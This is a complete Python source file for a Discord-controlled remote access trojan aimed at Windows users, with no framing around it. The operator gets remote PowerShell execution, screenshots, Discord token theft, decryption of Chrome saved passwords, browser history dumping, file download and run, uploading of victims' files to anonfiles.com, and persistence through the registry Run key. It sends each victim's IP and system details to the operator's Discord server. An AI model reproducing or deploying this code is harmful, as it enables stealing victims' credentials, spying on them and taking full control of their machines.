import os
import discord
import subprocess
import requests
import re
import json
import win32crypt
import base64
import shutil
import sqlite3
import winreg
from Crypto.Cipher import AES
from PIL import ImageGrab
from datetime import datetime

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

guild_id = "Server_id"  # server
token = "Bot token"  # bot token


def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName . | Select-Object -Property Name"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]


def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName . | Select-Object -Property Name"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]


def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName . | Select-Object -Property Caption"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]


intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "cwd - Get current working directory",
    "cd - Change directory",
    "ls - List directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "shell - Execute shell command",
    "run <file> - Run an file",
    "exit - Exit the session",
    "screenshot - Take a screenshot",
    "tokens - Get all discord tokens",
    "passwords - Extract all browser passwords",
    "history - Extract all browser history",
    "startup <name> - Add to startup",
])


@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping":
        embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd"):
        directory = message.content[3:]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        if len(files) > 4093:
            open(f"{TEMP}\\list.txt", "w").write(files)
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\list.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download"):
        file = message.content[9:]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("upload"):
        link = message.content[7:]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell"):
        command = message.content[6:]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        if len(output) > 4093:
            open(f"{TEMP}\\output.txt", "w").write(output)
            embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\output.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run"):
        file = message.content[4:]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "exit":
        await message.channel.delete()
        await bot.close()

    if message.content == "screenshot":
        screenshot = ImageGrab.grab(all_screens=True)
        path = os.path.join(TEMP, "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content == "cwd":
        embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "tokens":
        tokens = []
        path = f"{APPDATA}\\discord"
        if not os.path.exists(path):
            embed = discord.Embed(title="Error", description="```Discord not installed```", color=0xfafafa)
            return await message.reply(embed=embed)
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            embed = discord.Embed(title="Error", description="```Local State file not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        with open(local_state_path, "r") as f:
            local_state = json.load(f)
        encrypted_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
        for file_name in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
            if file_name[-3:] not in ["log", "ldb"]:
                continue
            for line in [x.strip() for x in open(os.path.join(path, "Local Storage", "leveldb", file_name), "r", errors="ignore").readlines() if x.strip()]:
                for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
                    for token in re.findall(regex, line):
                        tokens.append(token)
        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "passwords":
        passwords = []
        path = f"{LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\"
        if not os.path.exists(path):
            embed = discord.Embed(title="Error", description="```Chrome not installed```", color=0xfafafa)
            return await message.reply(embed=embed)
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            embed = discord.Embed(title="Error", description="```Local State file not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        with open(local_state_path, "r") as f:
            local_state = json.load(f)
        encrypted_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
        login_db = os.path.join(path, "Login Data")
        if not os.path.exists(login_db):
            embed = discord.Embed(title="Error", description="```Login Data database not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        shutil.copy(login_db, "logindata.db")
        conn = sqlite3.connect("logindata.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            if not r[0]:
                continue
            encrypted_password = r[2]
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            passwords.append({
                "url": r[0],
                "username": r[1],
                "password": decrypted_password
            })
        cursor.close()
        conn.close()
        os.remove("logindata.db")
        embed = discord.Embed(title="Passwords", description=f"```{passwords}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "history":
        history_items = []
        path = f"{LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\"
        if not os.path.exists(path):
            embed = discord.Embed(title="Error", description="```Chrome not installed```", color=0xfafafa)
            return await message.reply(embed=embed)
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            embed = discord.Embed(title="Error", description="```Local State file not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        with open(local_state_path, "r") as f:
            local_state = json.load(f)
        encrypted_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
        history_db = os.path.join(path, "History")
        if not os.path.exists(history_db):
            embed = discord.Embed(title="Error", description="```History database not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        shutil.copy(history_db, "history.db")
        conn = sqlite3.connect("history.db")
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        for r in cursor.fetchall():
            history_items.append({
                "url": r[0],
                "title": r[1],
                "last_visit_time": datetime.utcfromtimestamp(r[2] / 1000000 - 11644473600)
            })
        cursor.close()
        conn.close()
        os.remove("history.db")
        embed = discord.Embed(title="History", description=f"```{history_items}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("startup"):
        name = message.content[8:]
        path = f"{LOCALAPPDATA}\\{name}.exe"
        shutil.copy(sys.argv[0], path)
        winreg.SetValueEx(
            winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE),
            name,
            0,
            winreg.REG_SZ,
            path
        )
        embed = discord.Embed(title="Added to startup", description=f"```{name}```", color=0xfafafa)
        await message.reply(embed=embed)


bot.run(token)
